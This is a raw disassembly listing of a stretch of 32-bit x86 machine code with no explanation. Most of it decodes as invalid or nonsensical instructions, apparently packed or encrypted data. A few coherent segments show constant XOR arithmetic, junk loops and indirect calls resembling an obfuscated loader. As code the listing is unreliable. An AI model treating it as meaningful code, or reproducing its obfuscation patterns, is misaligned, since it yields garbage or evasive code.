  4178a9:	mov    edi,DWORD PTR [ecx]
  4178ab:	or     dh,BYTE PTR [esi]
  4178ad:	jle    0x41784d
  4178af:	sar    BYTE PTR [ebp-0x6dbfeb45],1
  4178b5:	push   eax
  4178b6:	(bad)  
  4178b7:	cmp    eax,0x855dcc3d
  4178bc:	sub    bh,0xe2
  4178bf:	repz xlat BYTE PTR ds:[ebx]
  4178c1:	push   esp
  4178c2:	or     dh,BYTE PTR [ebx-0x53]
  4178c5:	icebp  
  4178c6:	sbb    bh,BYTE PTR [ebp-0x74]
  4178c9:	jnp    0x41793f
  4178cb:	cmp    esi,esp
  4178cd:	push   ebp
  4178ce:	in     al,0x7a
  4178d0:	clc    
  4178d1:	add    ecx,DWORD PTR [eax+0x3c]
  4178d4:	jmp    0x417afc
  4178d9:	cmp    eax,0xced7cecf
  4178de:	aad    0xc5
  4178e0:	aad    0x63
  4178e2:	popa   
  4178e3:	adc    DWORD PTR [edi],edx
  4178e5:	inc    eax
  4178e6:	dec    eax
  4178e7:	mov    bl,0x64
  4178e9:	add    al,0x33
  4178eb:	jg     0x417965
  4178ed:	add    eax,0x2a78787e
  4178f2:	(bad)  
  4178f3:	int    0xea
  4178f5:	retf   0x9b13
  4178f8:	ja     0x4178e8
  4178fa:	lds    esi,FWORD PTR [ecx-0x74968d46]
  417900:	xor    al,0x2a
  417902:	icebp  
  417903:	and    edi,esi
  417905:	jnp    0x4178c5
  417907:	fld    TBYTE PTR [edx+eax*2]
  41790a:	ds push es
  41790c:	ds test al,0x2e
  41790f:	mov    dh,0xb7
  417911:	adc    al,0xf4
  417913:	lds    edx,FWORD PTR [eax+0x2e0f624b]
  417919:	arpl   WORD PTR [ebx+0x4],bp
  41791c:	lock cmp DWORD PTR [esi],esi
  41791f:	mov    ds:0x3625ac6c,al
  417924:	sahf   
  417925:	int    0xc3
  417927:	(bad)  
  417928:	ins    BYTE PTR es:[edi],dx
  417929:	inc    edx
  41792a:	scas   al,BYTE PTR es:[edi]
  41792b:	sti    
  41792c:	jno    0x417994
  41792e:	mov    ebx,DWORD PTR [eax]
  417930:	rcr    DWORD PTR [edi],0xa0
  417933:	pop    es
  417934:	js     0x4179ae
  417936:	clc    
  417937:	in     al,dx
  417938:	ins    DWORD PTR es:[edi],dx
  417939:	jmp    FWORD PTR [ebx]
  41793b:	fst    st(4)
  41793d:	or     eax,0xe425f132
  417942:	push   esp
  417943:	js     0x417921
  417945:	mov    ecx,0x5cc56614
  41794a:	pop    ds
  41794b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41794c:	push   ss
  41794d:	dec    ebp
  41794e:	jmp    0x417922
  417950:	mov    edi,0xcd106249
  417955:	mov    al,0x1a
  417957:	push   esi
  417958:	cwde   
  417959:	ds and ch,bl
  41795c:	test   eax,0xaeb298ec
  417961:	mov    BYTE PTR [esi],al
  417963:	dec    ebp
  417964:	xchg   ebx,eax
  417965:	jle    0x4179c1
  417967:	sbb    eax,0xd450e17e
  41796d:	(bad)  
  41796e:	ffree  st(4)
  417970:	pop    ebx
  417971:	mov    edi,0x8c3ac2b0
  417976:	pop    eax
  417977:	popa   
  417978:	cs pop ebx
  41797a:	imul   ecx,ecx,0x9587f2ce
  417980:	sbb    cl,0x35
  417983:	retf   0x760
  417986:	xchg   edx,eax
  417987:	ret    
  417988:	pop    es
  417989:	jmp    0x7e0a4407
  41798e:	pop    ebx
  41798f:	das    
  417990:	mov    edx,0x9b0530f4
  417995:	xor    DWORD PTR [edx],ebx
  417997:	ret    
  417998:	xchg   ebp,eax
  417999:	mov    al,ds:0x6f0f3623
  41799e:	fwait
  41799f:	dec    esp
  4179a0:	lods   al,BYTE PTR ds:[esi]
  4179a1:	rol    BYTE PTR [ebp+0x19644e5b],0x52
  4179a8:	jle    0x41795b
  4179aa:	les    esi,FWORD PTR [ebp+0x63f579b8]
  4179b0:	mov    eax,0xbc2059a2
  4179b5:	cmp    BYTE PTR [eax-0x4cad665f],cl
  4179bb:	ins    BYTE PTR es:[edi],dx
  4179bc:	push   ebx
  4179bd:	and    edi,DWORD PTR [eax+0x5c]
  4179c0:	ins    BYTE PTR es:[edi],dx
  4179c1:	push   ds
  4179c2:	jb     0x41797c
  4179c4:	ss pop es
  4179c6:	pop    ds
  4179c7:	std    
  4179c8:	shl    DWORD PTR [edi+0x55],cl
  4179cb:	sbb    eax,0x5c22c4fb
  4179d0:	pushf  
  4179d1:	jnp    0x417a06
  4179d3:	inc    esp
  4179d4:	lods   al,BYTE PTR ds:[esi]
  4179d5:	sbb    esp,DWORD PTR [esi-0x73]
  4179d8:	sub    al,0x74
  4179da:	gs add al,0xbd
  4179dd:	mov    dh,0x3e
  4179df:	repz call 0x4730df01
  4179e5:	dec    ebp
  4179e6:	scas   eax,DWORD PTR es:[edi]
  4179e7:	mov    ebx,0x777f1136
  4179ec:	sbb    eax,0x6f176128
  4179f1:	push   edx
  4179f2:	fiadd  DWORD PTR [edx]
  4179f4:	or     al,0x8f
  4179f6:	iret   
  4179f7:	sti    
  4179f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179f9:	xor    bl,0x3a
  4179fc:	(bad)  
  4179fd:	mov    DWORD PTR [edx],esp
  4179ff:	imul   esi,ebx,0xfffffff6
  417a02:	fnstcw WORD PTR [ebp-0x1e]
  417a05:	out    0xd7,al
  417a07:	cmp    cl,BYTE PTR [ecx+eax*1+0x1c172d08]
  417a0e:	clc    
  417a0f:	aam    0x80
  417a11:	pop    eax
  417a12:	repz jmp 0x4179fe
  417a15:	sbb    BYTE PTR [ecx+0x12],al
  417a18:	lods   al,BYTE PTR ds:[esi]
  417a19:	sub    al,0xaf
  417a1b:	cmp    al,0xe8
  417a1d:	clc    
  417a1e:	mov    dl,0x86
  417a20:	enter  0x4a4e,0x66
  417a24:	dec    ebx
  417a25:	popf   
  417a26:	or     esp,ebx
  417a28:	pop    edi
  417a29:	or     eax,0xf887ffa0
  417a2e:	push   esi
  417a2f:	rol    edi,1
  417a31:	and    esp,DWORD PTR [edx]
  417a33:	jecxz  0x417a82
  417a35:	fisttp QWORD PTR ds:0xd0b8c64e
  417a3b:	jne    0x417aa5
  417a3d:	jp     0x417a70
  417a3f:	ins    DWORD PTR es:[edi],dx
  417a40:	cmp    BYTE PTR [edx+0x3738902b],dh
  417a46:	sbb    eax,0xc5dec046
  417a4b:	jns    0x417a14
  417a4d:	mov    dl,BYTE PTR [ebp-0x65dd86d7]
  417a53:	lods   eax,DWORD PTR ds:[esi]
  417a54:	mov    ebp,0xc50085e3
  417a59:	add    DWORD PTR [ebx-0xd851319],edx
  417a5f:	sbb    BYTE PTR [edi],bl
  417a61:	ins    BYTE PTR es:[edi],dx
  417a62:	mov    edx,0x67d714c1
  417a67:	int    0xd0
  417a69:	sub    eax,0x83d22949
  417a6e:	or     ecx,eax
  417a70:	or     DWORD PTR [edx+eax*2],esp
  417a73:	cmc    
  417a74:	jl     0x417a9c
  417a76:	inc    esp
  417a77:	push   ebp
  417a78:	ss mov dh,0x8d
  417a7b:	or     DWORD PTR [edx],edx
  417a7d:	(bad)  
  417a7e:	(bad)  
  417a80:	es add eax,0x218d1cc
  417a86:	push   es
  417a87:	mov    si,0x55ca
  417a8b:	jp     0x417a4e
  417a8d:	mov    dh,0x97
  417a8f:	pop    edx
  417a90:	in     al,dx
  417a91:	mov    eax,ds:0x3db9cc9
  417a96:	xchg   DWORD PTR [ecx-0x5b],ebp
  417a99:	fnstcw WORD PTR [esi*1-0x54d21794]
  417aa0:	dec    edx
  417aa1:	sub    bh,cl
  417aa3:	(bad)  
  417aa4:	aam    0x67
  417aa6:	neg    ebx
  417aa8:	fiadd  DWORD PTR [ebp+eax*4+0x6e]
  417aac:	or     ebx,esp
  417aae:	cmp    edx,DWORD PTR [esi+0x12]
  417ab1:	mov    ds:0x8e84416b,al
  417ab6:	adc    DWORD PTR [ecx-0x3fcc0ff2],ecx
  417abc:	push   ebp
  417abd:	stos   DWORD PTR es:[edi],eax
  417abe:	push   0xce6d5aa9
  417ac3:	(bad)  
  417ac4:	mov    al,0x8a
  417ac6:	or     ebp,DWORD PTR [ebx-0x716ffe85]
  417acc:	nop
  417acd:	sahf   
  417ace:	mov    esp,0xe235de23
  417ad3:	xchg   ecx,eax
  417ad4:	or     BYTE PTR [ecx+0xa],dh
  417ad7:	and    ch,BYTE PTR [edi]
  417ad9:	call   0x4cfe:0x4f18e1df
  417ae0:	sbb    al,0x29
  417ae2:	call   0xc652:0x18c4d3c6
  417ae9:	push   ebx
  417aea:	(bad)  
  417aeb:	repnz inc edi
  417aed:	arpl   WORD PTR [edi+0x3c],ax
  417af0:	in     eax,dx
  417af1:	mov    edi,0xeb6ea51e
  417af6:	cmp    eax,eax
  417af8:	shr    BYTE PTR [esi],0x34
  417afb:	mov    edx,0x510850ba
  417b00:	pop    es
  417b01:	mov    DWORD PTR [ebp+0x8],ecx
  417b04:	mov    eax,DWORD PTR [ebp-0x4]
  417b07:	xor    eax,edx
  417b09:	push   esi
  417b0a:	mov    esi,DWORD PTR [ebp+0x8]
  417b0d:	mov    ecx,0x327298
  417b12:	add    eax,ecx
  417b14:	cmp    DWORD PTR [esi+0x54],eax
  417b17:	pop    esi
  417b18:	je     0x417b26
  417b1e:	mov    eax,DWORD PTR [ebp+0x8]
  417b21:	jmp    0x417d67
  417b26:	mov    eax,DWORD PTR [ebp-0x4]
  417b29:	xor    eax,edx
  417b2b:	add    eax,ecx
  417b2d:	jmp    0x417d67
  417b32:	mov    eax,DWORD PTR [ebp-0x4]
  417b35:	jmp    0x417d5d
  417b3a:	cmp    eax,0xd53cc6d6
  417b3f:	int3   
  417b40:	leave  
  417b41:	fnstenv [esi-0x47]
  417b44:	or     eax,0x4147796c
  417b49:	aad    0x11
  417b4b:	xor    DWORD PTR [edi+0x78],edi
  417b4e:	add    eax,0x3078787e
  417b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b54:	jne    0x417af7
  417b56:	adc    edx,ecx
  417b58:	or     eax,0xaa799578
  417b5e:	cld    
  417b5f:	and    al,0xed
  417b61:	mov    esi,0x62502523
  417b66:	dec    edx
  417b67:	push   esi
  417b68:	mov    bh,0x5f
  417b6a:	aaa    
  417b6b:	sub    ebp,DWORD PTR ds:0xa4ff9325
  417b71:	push   es
  417b72:	mov    esp,0x3a0cc797
  417b77:	ins    DWORD PTR es:[edi],dx
  417b78:	test   DWORD PTR [ebp-0x174aaa1a],esp
  417b7e:	adc    ebx,DWORD PTR [ebp+eiz*1+0x5e]
  417b82:	xchg   DWORD PTR [edx],eax
  417b84:	jl     0x417b88
  417b86:	xchg   BYTE PTR [edi-0x33c546cc],ch
  417b8c:	mov    WORD PTR [ecx],ds
  417b8e:	popf   
  417b8f:	lods   eax,DWORD PTR ds:[esi]
  417b90:	jg     0x417b95
  417b92:	push   ebp
  417b93:	imul   ebx,esp,0xbeb75a5a
  417b99:	jns    0x417b7e
  417b9b:	jl     0x417bfc
  417b9d:	shl    BYTE PTR [edi],cl
  417b9f:	ror    BYTE PTR [ecx-0x3c38b8a],1
  417ba5:	pop    ds
  417ba6:	mov    ebp,0xdfe038cf
  417bab:	or     eax,0x67021ec5
  417bb0:	sbb    ebp,DWORD PTR [esi]
  417bb2:	pop    edi
  417bb3:	scas   eax,DWORD PTR es:[edi]
  417bb4:	mov    eax,ds:0x21f0b380
  417bb9:	mov    dh,0x6d
  417bbb:	ret    
  417bbc:	cmp    DWORD PTR [esi],esi
  417bbe:	jle    0x417b89
  417bc0:	push   ebp
  417bc1:	push   es
  417bc2:	call   0x5def:0x4914895b
  417bc9:	repz xor DWORD PTR [esi],ecx
  417bcc:	test   BYTE PTR [ecx+0x23],ch
  417bcf:	mov    ds:0xa996ddab,al
  417bd4:	sahf   
  417bd5:	xor    cl,BYTE PTR [eax+0x50]
  417bd8:	retf   0xd49c
  417bdb:	jmp    0x417be4
  417bdd:	xor    esp,ebp
  417bdf:	(bad)  
  417be0:	in     eax,0xc3
  417be2:	call   0x51f9:0x445717af
  417be9:	ret    0x63f
  417bec:	and    ch,BYTE PTR [esi+esi*4+0x2b]
  417bf0:	fidiv  DWORD PTR [esi+0x75]
  417bf3:	pop    ebp
  417bf4:	sti    
  417bf5:	loope  0x417c0c
  417bf7:	popf   
  417bf8:	sbb    BYTE PTR [esi],dh
  417bfa:	add    edi,DWORD PTR [ebp-0x42]
  417bfd:	xchg   ecx,eax
  417bfe:	sub    dl,cl
  417c00:	add    DWORD PTR [ebp+0x71],esp
  417c03:	or     ah,ah
  417c05:	stos   BYTE PTR es:[edi],al
  417c06:	pop    ss
  417c07:	and    esi,DWORD PTR ds:0x19643760
  417c0d:	in     al,dx
  417c0e:	xor    edx,ecx
  417c10:	push   ebx
  417c11:	xor    eax,0xa21eb88f
  417c16:	push   ecx
  417c17:	xlat   BYTE PTR ds:[ebx]
  417c18:	(bad)  
  417c19:	mov    cl,0x78
  417c1b:	lods   eax,DWORD PTR ds:[esi]
  417c1c:	and    ebx,esp
  417c1e:	in     eax,0xf2
  417c20:	int3   
  417c21:	(bad)
  417c24:	daa    
  417c25:	sbb    al,0x5d
  417c27:	and    DWORD PTR [ebx-0x2fd5994e],0x40093ebd
  417c31:	fidiv  DWORD PTR [ecx]
  417c33:	(bad)  
  417c34:	jo     0x417ca6
  417c36:	gs std 
  417c38:	jb     0x417cb8
  417c3a:	icebp  
  417c3b:	jmp    0xcd89:0x37151375
  417c42:	xchg   edx,eax
  417c43:	and    eax,0x45febfef
  417c48:	in     al,dx
  417c49:	mov    edx,0x1308ab84
  417c4e:	stos   BYTE PTR es:[edi],al
  417c4f:	xchg   edi,eax
  417c50:	leave  
  417c51:	lea    ebp,[eax]
  417c53:	fmul   QWORD PTR ss:[ecx+ebp*8]
  417c57:	mov    BYTE PTR [ebx+0x57],ch
  417c5a:	xor    bl,bh
  417c5c:	pop    edi
  417c5d:	rol    DWORD PTR [ecx],cl
  417c5f:	push   es
  417c60:	mov    ecx,0x259e517
  417c65:	lahf   
  417c66:	fisub  WORD PTR [eax-0x7c]
  417c69:	pop    edx
  417c6a:	jbe    0x417ce7
  417c6c:	cmp    al,0x9b
  417c6e:	test   eax,0xef388a85
  417c73:	out    dx,al
  417c74:	push   esp
  417c75:	jl     0x417ce1
  417c77:	adc    eax,0x6c78cd97
  417c7c:	and    bh,BYTE PTR [ebp-0x188f24e7]
  417c82:	adc    esp,DWORD PTR [esi-0x7faca604]
  417c88:	mov    edx,0xd646811a
  417c8d:	push   ss
  417c8e:	das    
  417c8f:	xor    ah,0xbc
  417c92:	xor    esi,edx
  417c94:	lock dec BYTE PTR [edx-0x7e335665]
  417c9b:	xchg   edi,eax
  417c9c:	out    dx,al
  417c9d:	test   eax,0xef4c5f9e
  417ca2:	(bad)  [esi]
  417ca4:	jmp    0x417c85
  417ca6:	lods   al,BYTE PTR ds:[esi]
  417ca7:	idiv   BYTE PTR [ebx]
  417ca9:	pop    ebp
  417caa:	mov    ebx,0x95ee3852
  417caf:	in     eax,0x8f
  417cb1:	cli    
  417cb2:	(bad)  
  417cb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cb5:	jecxz  0x417cb0
  417cb7:	mov    ds:0x83054cfe,eax
  417cbc:	sub    ah,dl
  417cbe:	bound  edx,QWORD PTR [edx+0x56]
  417cc1:	(bad)  
  417cc2:	rcr    BYTE PTR [eax],1
  417cc4:	mul    BYTE PTR [eax-0x6e]
  417cc7:	aaa    
  417cc8:	fild   QWORD PTR [ecx]
  417cca:	sahf   
  417ccb:	fs mov bl,0x7c
  417cce:	mov    ebp,0x256277c
  417cd3:	inc    edi
  417cd4:	adc    DWORD PTR [edi-0x11],ecx
  417cd7:	jbe    0x417c83
  417cd9:	(bad)  
  417cdb:	sbb    BYTE PTR [edi+edx*8-0x65b6f23b],dl
  417ce2:	mov    ss,WORD PTR [ecx+0x5c]
  417ce5:	aas    
  417ce6:	cmp    al,0xf8
  417ce8:	push   edi
  417ce9:	pop    ebx
  417cea:	sahf   
  417ceb:	jl     0x417cd4
  417ced:	fistp  WORD PTR [esi]
  417cef:	and    ah,BYTE PTR [esi]
  417cf1:	cwde   
  417cf2:	sub    al,0xa
  417cf4:	mov    bl,0x99
  417cf6:	adc    DWORD PTR [esi+0xf],ebp
  417cf9:	ja     0x417d08
  417cfb:	sbb    BYTE PTR gs:[eax],0x9e
  417cff:	xor    BYTE PTR [esi+0x519f6c72],ch
  417d05:	xchg   edx,eax
  417d06:	out    0x7c,al
  417d08:	loop   0x417d06
  417d0a:	les    edx,FWORD PTR [ebp+0x12]
  417d0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d0e:	dec    ebx
  417d0f:	retf   0x3dd2
  417d12:	retf   
  417d13:	out    0x85,eax
  417d15:	cmp    al,0xd
  417d17:	aad    0x17
  417d19:	pop    ecx
  417d1a:	shl    BYTE PTR [ecx-0x6],cl
  417d1d:	mov    dl,0x10
  417d1f:	cmp    al,BYTE PTR [ebx-0x65]
  417d22:	fidivr WORD PTR [ecx+0x61]
  417d25:	mov    ebp,0xcd9d08ae
  417d2a:	xchg   esp,eax
  417d2b:	mov    DWORD PTR [ebx],0x844053b7
  417d31:	push   ecx
  417d32:	rol    DWORD PTR [eax-0x7a9ebbc4],0xaf
  417d39:	imul   edi,DWORD PTR [edi+ebx*4-0x11c01fae],0xac85ccaa
  417d44:	test   eax,0x29c50095
  417d49:	pop    ss
  417d4a:	addr16 dec edx
  417d4c:	int    0x1d
  417d4e:	push   esp
  417d4f:	ja     0x417d12
  417d51:	dec    esi
  417d52:	call   0x68255da1
  417d57:	addr16 pop ds
  417d59:	push   esi
  417d5a:	fwait
  417d5b:	mov    dl,0x1f
  417d5d:	xor    eax,0x7510850
  417d62:	add    eax,0x327298
  417d67:	leave  
  417d68:	ret    0x4
  417d6b:	push   ebp
  417d6c:	mov    ebp,esp
  417d6e:	push   ecx
  417d6f:	and    DWORD PTR ds:0x42a801,0x0
  417d79:	jmp    0x417d8b
  417d7e:	mov    ecx,DWORD PTR ds:0x42a801
  417d84:	inc    ecx
  417d85:	mov    DWORD PTR ds:0x42a801,ecx
  417d8b:	cmp    DWORD PTR ds:0x42a801,0x13
  417d92:	jae    0x417dbe
  417d98:	cmp    DWORD PTR ds:0x42a801,0x16
  417d9f:	jne    0x417db3
  417da5:	push   0x42a805
  417daa:	push   DWORD PTR [ebp-0x18]
  417dad:	call   DWORD PTR ds:0x41d1f8
  417db3:	jmp    0x417d7e
  417db8:	adc    eax,DWORD PTR ds:0x42a77d
  417dbe:	mov    ecx,DWORD PTR [ebp+0x8]
  417dc1:	inc    eax
  417dc2:	mov    eax,0x7510850
  417dc7:	and    DWORD PTR ds:0x42a83d,0x42a831
  417dd1:	xor    ecx,eax
  417dd3:	or     DWORD PTR ds:0x42a835,0x42a889
  417ddd:	add    ecx,0x327298
  417de3:	mov    DWORD PTR ds:0x42a775,0xf60
  417ded:	mov    DWORD PTR [ebp+0x10],ecx
  417df0:	not    ecx
  417df2:	mov    DWORD PTR [ebp+0x8],0xf34cebc
  417df9:	mov    DWORD PTR ds:0x42a835,ebx
  417dff:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  417e06:	mov    DWORD PTR ds:0x42a80d,edi
  417e0c:	mov    ecx,0xf89c8539
  417e11:	push   esi
  417e12:	mov    DWORD PTR [ebp+0x10],0x70019fa
  417e19:	mov    esi,0x3248
  417e1e:	mov    esi,DWORD PTR [ebp-0x4]
  417e21:	cmp    ecx,esi
  417e23:	mov    DWORD PTR ds:0x42a759,0x4596
  417e2d:	je     0x4187eb
  417e33:	and    DWORD PTR ds:0x42a7f1,0x0
  417e3d:	jmp    0x417e51
  417e42:	xor    esi,esi
  417e44:	or     esi,DWORD PTR ds:0x42a7f1
  417e4a:	inc    esi
  417e4b:	mov    DWORD PTR ds:0x42a7f1,esi
  417e51:	cmp    DWORD PTR ds:0x42a7f1,0x11
  417e58:	jae    0x418196
  417e5e:	cmp    DWORD PTR ds:0x42a7f1,0x1d
  417e65:	jne    0x417e77
  417e6b:	push   DWORD PTR [ebp-0x28]
  417e6e:	push   DWORD PTR [ebp-0x14]
  417e71:	call   DWORD PTR ds:0x41d274
  417e77:	jmp    0x417e42
  417e7c:	jmp    0x418196
  417e81:	ret    
  417e82:	ret    0xc0c0
  417e85:	(bad)
  417e88:	leave  
  417e89:	retf   0xfdf1
  417e8c:	(bad)  
  417e8d:	jp     0x417ed2
  417e8f:	pushf  
  417e90:	nop
  417e91:	push   ds
  417e92:	aaa    
  417e93:	jg     0x417f0d
  417e95:	jnp    0x417f15
  417e97:	js     0x417f11
  417e99:	xchg   ebx,eax
  417e9a:	sub    DWORD PTR [esi-0x7d],esp
  417e9d:	or     edi,DWORD PTR [esi+0x20]
  417ea0:	sub    ch,dl
  417ea2:	jb     0x417eb2
  417ea4:	jno    0x417e38
  417ea6:	fwait
  417ea7:	mov    ch,0xea
  417ea9:	rcl    DWORD PTR [esp+edx*4-0x11],cl
  417ead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417eae:	(bad)  
  417eaf:	adc    bl,BYTE PTR [eax-0x5d]
  417eb2:	and    al,0x47
  417eb4:	push   ds
  417eb5:	dec    ebx
  417eb6:	cld    
  417eb7:	fstp   DWORD PTR [ecx+0x72cee18f]
  417ebd:	stos   BYTE PTR es:[edi],al
  417ebe:	mov    al,ds:0xee0be36f
  417ec3:	test   DWORD PTR [ebx+0x4b],ecx
  417ec6:	xchg   ebp,eax
  417ec7:	jbe    0x417f48
  417ec9:	sub    al,0xd8
  417ecb:	and    bh,BYTE PTR [esi-0x23860fef]
  417ed1:	loope  0x417f4e
  417ed3:	lds    edx,FWORD PTR gs:[edx+esi*8]
  417ed7:	add    edi,esp
  417ed9:	loope  0x417ebf
  417edb:	outs   dx,BYTE PTR ds:[esi]
  417edc:	jecxz  0x417ecf
  417ede:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417edf:	adc    dh,BYTE PTR [ebx+0x75993406]
  417ee5:	pop    edi
  417ee6:	and    DWORD PTR [ebx-0x7a41995b],esp
  417eec:	dec    esi
  417eed:	not    BYTE PTR [edi]
  417eef:	pop    ebx
  417ef0:	push   edx
  417ef1:	add    DWORD PTR [edi],eax
  417ef3:	in     al,0x20
  417ef5:	inc    eax
  417ef6:	stc    
  417ef7:	dec    ecx
  417ef8:	out    dx,eax
  417ef9:	push   ebp
  417efa:	imul   ecx,DWORD PTR fs:0xec3ca4b4,0xca2f70b7
  417f05:	add    ecx,ebx
  417f07:	jnp    0x417f7a
  417f09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f0a:	shl    BYTE PTR [edx-0x190b12c9],1
  417f10:	mov    eax,ds:0xf85c92a5
  417f15:	mov    al,ds:0xbf5ba46f
  417f1a:	add    DWORD PTR [edx],0xb
  417f1d:	lock add cl,BYTE PTR [ecx]
  417f20:	mov    ecx,0x36f9389f
  417f25:	mov    ebx,0x6083c432
  417f2a:	xchg   edi,eax
  417f2b:	shr    edx,1
  417f2d:	jns    0x417fa6
  417f2f:	aaa    
  417f30:	jno    0x417fa6
  417f32:	xchg   esp,eax
  417f33:	ror    ecx,1
  417f35:	xor    DWORD PTR [eiz*8+0x313fd2d9],ebx
  417f3c:	mov    ch,0x16
  417f3e:	dec    esp
  417f3f:	repnz mov al,ds:0x9d12d9af
  417f46:	loop   0x417f13
  417f48:	dec    ebp
  417f49:	jne    0x417f08
  417f4b:	ss xor eax,0xa03ce344
  417f51:	fadd   DWORD PTR [ebx+ecx*4]
  417f54:	mov    esi,0x377b46f6
  417f59:	sbb    DWORD PTR [eax-0x7fcfe7a2],0x1fb310e1
  417f63:	adc    DWORD PTR [ecx-0x2471e8fd],ecx
  417f69:	fnstcw WORD PTR [ecx-0x6e503355]
  417f6f:	js     0x417f46
  417f71:	and    BYTE PTR [ebp+0x25],ch
  417f74:	xchg   ecx,eax
  417f75:	(bad)  
  417f76:	aam    0x94
  417f78:	mov    dh,BYTE PTR [ebx]
  417f7a:	pushf  
  417f7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f7c:	or     ecx,DWORD PTR [edx+ebp*8-0x162c41f1]
  417f83:	outs   dx,BYTE PTR ds:[esi]
  417f84:	pop    ebp
  417f85:	stc    
  417f86:	dec    ebx
  417f87:	xor    BYTE PTR [ecx-0x6f3d2052],bh
  417f8d:	mov    esi,0xd0009ac9
  417f92:	stc    
  417f93:	jecxz  0x417f86
  417f95:	adc    BYTE PTR [ebp+0x64],bh
  417f98:	and    BYTE PTR [ecx-0x2b6df059],dl
  417f9e:	mov    ebx,0xdfe0d388
  417fa3:	pop    ss
  417fa4:	mov    bl,0xb3
  417fa6:	xor    BYTE PTR [ebp-0x6fd8f22d],0xb
  417fad:	popf   
  417fae:	xchg   edi,eax
  417faf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fb0:	inc    ecx
  417fb1:	ror    BYTE PTR [edx+0x71443ca0],1
  417fb7:	inc    ebp
  417fb8:	ins    DWORD PTR es:[edi],dx
  417fb9:	fnsave [ebp-0x3e89409]
  417fbf:	iret   
  417fc0:	fmul   QWORD PTR [eax+0x7b]
  417fc3:	ins    DWORD PTR es:[edi],dx
  417fc4:	or     al,BYTE PTR [eax-0x5c4c8d3c]
  417fca:	mov    edi,0x51559cb8
  417fcf:	shl    bh,cl
  417fd1:	jb     0x417f5f
  417fd3:	fst    st(0)
  417fd5:	aad    0x3
  417fd7:	in     eax,0xde
  417fd9:	and    al,0x46
  417fdb:	rcl    BYTE PTR [ebx+0x6854546e],1
  417fe1:	rsm    
  417fe3:	and    BYTE PTR [ebp+0x35],al
  417fe6:	retf   0xc492
  417fe9:	stc    
  417fea:	dec    esi
  417feb:	je     0x417f70
  417fed:	loopne 0x418062
  417fef:	iret   
  417ff0:	mov    ebp,0x1589df55
  417ff5:	inc    ecx
  417ff6:	mov    eax,ds:0xb932ef4f
  417ffb:	mov    al,0x28
  417ffd:	pop    edx
  417ffe:	jle    0x417ff0
  418000:	xor    al,0x96
  418002:	fst    DWORD PTR [edx-0x742032e2]
  418008:	into   
  418009:	push   0x4d
  41800b:	jmp    0x68e5:0x885e12b7
  418012:	mov    ecx,0x9f0d641a
  418017:	loope  0x418021
  418019:	mov    es,WORD PTR ds:0x3571e372
  41801f:	or     al,0x87
  418021:	fs hlt 
  418023:	xlat   BYTE PTR ds:[ebx]
  418024:	and    edi,DWORD PTR [edi]
  418026:	jo     0x418007
  418028:	push   edx
  418029:	in     eax,0x72
  41802b:	fs sbb eax,0x65c3173e
  418031:	cs clc 
  418033:	aas    
  418034:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418035:	xor    eax,0xfb019fe4
  41803a:	mov    ecx,0xd535c242
  41803f:	out    0x68,eax
  418041:	dec    ebx
  418042:	dec    esp
  418043:	fldcw  WORD PTR [ebx]
  418045:	add    BYTE PTR [edx+0x4b],0x24
  418049:	jp     0x4180ae
  41804b:	push   ecx
  41804c:	imul   ebp,DWORD PTR [edx-0xc],0xc3124758
  418053:	or     DWORD PTR [esi-0x6],edi
  418056:	and    dh,bh
  418058:	pop    ecx
  418059:	mov    dl,0x60
  41805b:	xor    cl,al
  41805d:	lea    edi,[esi-0x2ba931bf]
  418063:	push   ss
  418064:	bswap  eax
  418066:	aaa    
  418067:	stos   DWORD PTR es:[edi],eax
  418068:	pop    ebx
  418069:	inc    eax
  41806a:	or     BYTE PTR [edi-0x30],ah
  41806d:	add    eax,0x5aff7404
  418072:	pusha  
  418073:	pop    eax
  418074:	lods   al,BYTE PTR ds:[esi]
  418075:	aam    0x8a
  418077:	(bad)  
  418078:	leave  
  418079:	jl     0x4180e0
  41807b:	jecxz  0x4180b3
  41807d:	cdq    
  41807e:	mov    WORD PTR [edi],ds
  418080:	int3   
  418081:	mov    esp,0x2cc38ce7
  418086:	cmp    bl,BYTE PTR [ecx+edx*4+0x5a]
  41808a:	dec    ebp
  41808b:	jo     0x418045
  41808d:	shr    bh,1
  41808f:	and    eax,0x5b12120c
  418094:	or     BYTE PTR [ebx+0x550b967],0xeb
  41809b:	add    al,0x3c
  41809d:	xchg   edi,eax
  41809e:	(bad)  
  41809f:	xor    al,0xe0
  4180a1:	cwde   
  4180a2:	stos   DWORD PTR es:[edi],eax
  4180a3:	inc    edi
  4180a4:	adc    BYTE PTR [esp-0x40],cl
  4180a8:	mul    BYTE PTR [ebp+0x6d708098]
  4180ae:	xor    BYTE PTR [ecx+0x63746c3a],cl
  4180b4:	(bad)  
  4180b5:	pop    ebx
  4180b6:	adc    eax,0x881a1453
  4180bb:	add    edx,esp
  4180bd:	stc    
  4180be:	inc    edi
  4180bf:	mov    ebx,0x413d10f2
  4180c4:	cwde   
  4180c5:	(bad)  [esi]
  4180c7:	repz loop 0x41804f
  4180ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180cb:	out    dx,eax
  4180cc:	dec    ebx
  4180cd:	les    edx,FWORD PTR [ebp-0x7c]
  4180d0:	sbb    al,0xc8
  4180d2:	pop    ebp
  4180d3:	inc    eax
  4180d4:	or     BYTE PTR [edx-0x30],ch
  4180d7:	in     eax,0x3a
  4180d9:	push   ecx
  4180da:	sbb    al,0x7b
  4180dc:	sbb    BYTE PTR [ecx],bl
  4180de:	sub    al,0xd0
  4180e0:	sbb    al,0x64
  4180e2:	cs cdq 
  4180e4:	jae    0x418125
  4180e6:	rcr    DWORD PTR [ecx+eax*1-0x13cc8ceb],0x62
  4180ee:	pop    edx
  4180ef:	fmul   st(7),st
  4180f1:	mov    eax,ds:0x9bfd4d36
  4180f6:	(bad)  
